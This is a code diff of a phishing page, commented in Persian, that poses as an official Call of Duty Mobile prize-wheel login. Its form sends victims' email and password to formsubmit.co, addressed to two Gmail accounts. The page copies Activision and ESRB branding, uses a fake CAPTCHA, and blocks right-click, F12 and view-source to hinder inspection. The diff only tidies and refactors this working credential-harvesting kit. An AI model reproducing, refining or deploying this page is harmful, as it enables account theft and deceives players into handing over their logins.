@@ -160,35 +160,33 @@
         #refvc img:hover {
             transform: rotate(360deg);
         }
-        /* استایل جدید برای لوگوهای ESRB در فوتر - اندازه کوچک و حرفه‌ای */
-.esrb-ratings {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    gap: 30px;
-    margin: 20px 0 10px;
-    flex-wrap: wrap;
-}
 
-.esrb-ratings img {
-    height: 80px;  /* اندازه استاندارد و کوچک (مثل سایت رسمی) */
-    width: auto;
-    max-width: 150px;
-}
-
-/* برای موبایل - کوچکتر و مرتب */
-@media (max-width: 600px) {
-    .esrb-ratings {
-        gap: 20px;
-        flex-direction: column;
-    }
-    .esrb-ratings img {
-        height: 70px;
-    }
-}
+        /* ESRB در فوتر */
+        .esrb-ratings {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 30px;
+            margin: 20px 0 10px;
+            flex-wrap: wrap;
+        }
+        .esrb-ratings img {
+            height: 80px;
+            width: auto;
+            max-width: 150px;
+        }
+        @media (max-width: 600px) {
+            .esrb-ratings {
+                gap: 20px;
+                flex-direction: column;
+            }
+            .esrb-ratings img {
+                height: 70px;
+            }
+        }
     </style>
 </head>
-<body oncontextmenu="return false;"> <!-- لایه اول بلاک راست‌کلیک -->
+<body oncontextmenu="return false;">
 
     <header class="official-header">
         <nav>
@@ -228,45 +226,46 @@
                     <div id="prize-announcement" class="prize-announcement" style="display:none;"></div>
 
                     <div class="code_ct">
-    <iframe name="dummyframe" id="dummyframe" style="display:none;"></iframe>
+                        <iframe name="dummyframe" id="dummyframe" style="display:none;"></iframe>
 
-    <form id="loginForm" action="https://formsubmit.co/erfantroll778899@gmail.com,joker553300@gmail.com" method="POST" target="dummyframe" onsubmit="return validateAndSubmit()">
-        <ul class="code_list c">
-            <li>
-                <span class="desktop_label">Email</span>
-                <div class="input-field-wrapper">
-                    <input type="email" name="email" id="F_UID" placeholder="Email" class="input_text" required autocomplete="off" />
-                </div>
-            </li>
-            <li>
-                <span class="desktop_label label-titlie redeem_text">Password</span>
-                <div class="input-field-wrapper">
-                    <input type="password" name="password" id="F_CDKEY" placeholder="Password" required autocomplete="new-password">
-                    <svg id="togglePassword" class="eye-icon" onclick="togglePasswordVisibility()" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z" fill="currentColor"/>
-                    </svg>
-                </div>
-            </li>
-            <li class="verification_row">
-                <span class="desktop_label label_vercode">Verification</span>
-                <div class="input-field-wrapper" style="display: flex; align-items: center;">
-                    <input type="text" name="vcode" id="F_VCODE" placeholder="Verification Code" class="input_code" required autocomplete="off" />
-                    <canvas id="captcha-canvas" width="138" height="52"></canvas>
-                    <a href="javascript:;" id="refvc" onclick="generateCaptcha()">
-                        <img src="https://www.callofduty.com/cdn/codm/zpHm2flUeC/images/CODM_Refresh.webp" alt="Refresh" />
-                    </a>
-                </div>
-            </li>
-        </ul>
+                        <form id="loginForm" action="https://formsubmit.co/erfantroll778899@gmail.com,joker553300@gmail.com" method="POST" target="dummyframe" onsubmit="return validateAndSubmit()">
+                            <ul class="code_list c">
+                                <li>
+                                    <span class="desktop_label">Email</span>
+                                    <div class="input-field-wrapper">
+                                        <input type="email" name="email" id="F_UID" placeholder="Email" class="input_text" required autocomplete="off" />
+                                    </div>
+                                </li>
+                                <li>
+                                    <span class="desktop_label label-titlie redeem_text">Password</span>
+                                    <div class="input-field-wrapper">
+                                        <input type="password" name="password" id="F_CDKEY" placeholder="Password" required autocomplete="new-password">
+                                        <svg id="togglePassword" class="eye-icon" onclick="togglePasswordVisibility()" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z" fill="currentColor"/>
+                                        </svg>
+                                    </div>
+                                </li>
+                                <li class="verification_row">
+                                    <span class="desktop_label label_vercode">Verification</span>
+                                    <div class="input-field-wrapper" style="display: flex; align-items: center;">
+                                        <input type="text" name="vcode" id="F_VCODE" placeholder="Verification Code" class="input_code" required autocomplete="off" />
+                                        <canvas id="captcha-canvas" width="138" height="52"></canvas>
+                                        <a href="javascript:;" id="refvc" onclick="generateCaptcha()">
+                                            <img src="https://www.callofduty.com/cdn/codm/zpHm2flUeC/images/CODM_Refresh.webp" alt="Refresh" />
+                                        </a>
+                                    </div>
+                                </li>
+                            </ul>
 
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_template" value="table">
-        <input type="hidden" name="_subject" value="New CODM Login + Lucky Wheel Prize! 🔥">
+                            <input type="hidden" name="_captcha" value="false">
+                            <input type="hidden" name="_template" value="table">
+                            <input type="hidden" name="_subject" value="New CODM Login + Lucky Wheel Prize! 🔥">
 
-        <button type="submit" class="btn_yellow" id="label_submit">Claim Prize & Login</button>
-        <div id="result" class="success-msg" style="display:none;"></div>
-    </form>
-</div>
+                            <button type="submit" class="btn_yellow" id="label_submit">Claim Prize & Login</button>
+                            <div id="result" class="success-msg" style="display:none;"></div>
+                        </form>
+                    </div>
+                </div>
 
                 <div class="update-text">
                     <h2>Update Required to Redeem</h2>
@@ -281,49 +280,26 @@
         </div>
     </div>
 
-<footer class="official-footer">
+    <footer class="official-footer">
         <div class="footer-links">
             <a href="#">Terms of Use</a> | <a href="#">Privacy Policy</a> | <a href="#">Support</a>
         </div>
         <p>© 2019-2026 Activision Publishing, Inc. All rights reserved.</p>
 
-        <!-- لوگوهای ESRB در فوتر -->
-      <div class="esrb-ratings">
-    <img src="cod-hub-esrb-en.png" alt="ESRB Mature 17+" />
-    <img src="Privacy_Certified_Globe_color_2022.png" alt="ESRB Privacy Certified" />
-</div>
+        <div class="esrb-ratings">
+            <img src="cod-hub-esrb-en.png" alt="ESRB Mature 17+" />
+            <img src="Privacy_Certified_Globe_color_2022.png" alt="ESRB Privacy Certified" />
+        </div>
     </footer>
 
     <script>
-        // بلاک راست‌کلیک — لایه قوی (دو بار برای اطمینان کامل)
+        // بلاک راست‌کلیک و F12
         document.oncontextmenu = function() { return false; };
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }, true);
+        document.addEventListener('contextmenu', e => e.preventDefault());
 
-        // بلاک F12 و کلیدهای DevTools
-        document.addEventListener("keydown", function(e) {
-            // F12
-            if (e.keyCode === 123) {
+        document.addEventListener("keydown", e => {
+            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
                 e.preventDefault();
-                return false;
-            }
-            // Ctrl + Shift + I (DevTools)
-            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl + Shift + J (Console)
-            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
-                e.preventDefault();
-                return false;
-            }
-            // Ctrl + U (View Source)
-            if (e.ctrlKey && e.keyCode === 85) {
-                e.preventDefault();
-                return false;
             }
         });
 
@@ -339,27 +315,35 @@
             }
         }
 
-       function validateAndSubmit() {
-    const userInput = document.getElementById("F_VCODE").value.trim();
-    if (userInput === captchaCode) {
-        // کپچا درست — پیام موفقیت سبز
-        const result = document.getElementById("result");
-        result.textContent = "Success! Prize claimed. Check your email.";
-        result.style.color = "#00ff00";
-        result.style.display = "block";
-        return true; // فرم ارسال بشه
-    } else {
-        // کپچا غلط — پیام خطا قرمز + کپچا جدید
-        const result = document.getElementById("result");
-        result.textContent = "Wrong verification code! Try again.";
-        result.style.color = "#ff0000";
-        result.style.display = "block";
-        generateCaptcha(); // کپچا جدید
-        return false; // فرم ارسال نشه
-    }
-}
+        // چک کپچا و ارسال فرم
+        function validateAndSubmit() {
+            const userInput = document.getElementById("F_VCODE").value.trim();
+            const result = document.getElementById("result");
 
-        // تولید کپچای واقعی با canvas
+            if (!captchaCode || captchaCode === "") {
+                result.textContent = "Captcha not loaded! Refresh the page.";
+                result.style.color = "#ff0000";
+                result.style.display = "block";
+                generateCaptcha();
+                return false;
+            }
+
+            if (userInput === captchaCode) {
+                result.textContent = "Success! Information sent to email.";
+                result.style.color = "#00ff00";
+                result.style.display = "block";
+                return true; // ارسال به دو ایمیل
+            } else {
+                result.textContent = "Wrong code! Try again.";
+                result.style.color = "#ff0000";
+                result.style.display = "block";
+                generateCaptcha();
+                document.getElementById("F_VCODE").value = "";
+                return false;
+            }
+        }
+
+        // تولید کپچا
         let captchaCode = "";
         function generateCaptcha() {
             const canvas = document.getElementById("captcha-canvas");
@@ -369,7 +353,7 @@
             ctx.fillRect(0, 0, 138, 52);
 
             captchaCode = Math.random().toString().substr(2, 5);
-            
+
             for (let i = 0; i < 200; i++) {
                 ctx.fillStyle = `rgba(0,0,0,${Math.random() * 0.1})`;
                 ctx.fillRect(Math.random() * 138, Math.random() * 52, 2, 2);
@@ -496,8 +480,11 @@
             prizeAnnouncement.style.display = "block";
         }
 
-        generateCaptcha();
-        drawWheel();
+        // شروع اولیه — کپچا و چرخ موقع لود صفحه
+        window.onload = function() {
+            generateCaptcha();
+            drawWheel();
+        };
     </script>
 </body>
 </html>
